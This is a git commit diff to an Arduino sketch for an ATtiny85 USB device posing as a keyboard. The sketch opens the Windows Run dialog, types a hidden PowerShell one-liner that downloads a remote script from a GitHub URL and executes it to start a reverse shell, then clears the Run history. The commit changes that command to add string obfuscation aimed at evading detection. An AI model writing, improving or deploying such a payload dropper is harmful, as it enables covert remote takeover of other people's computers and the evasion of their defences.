159d142e8142c82d084b5aac6d83feb483a6742b
Sajith Gairuka Jayaweera <104394666+sajithgairuka@users.noreply.github.com>
2022-05-23 04:20:14 +0530

    Update Payload_dropper.ino

--- Payload_dropper/Payload_dropper.ino
+++ Payload_dropper/Payload_dropper.ino
@@ -10,11 +10,11 @@ void setup() {
   // download + start reverse shell
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sajithgairuka/Attiny85-Attcks/main/pd.txt');\"");
+  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sajithgairuka/Attiny85-Attcks/main/pd.txt');\"");
   DigiKeyboard.delay(9000);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT );
   DigiKeyboard.sendKeyStroke(KEY_ENTER );
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(5000);
 
   // clean up the run dialog history
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
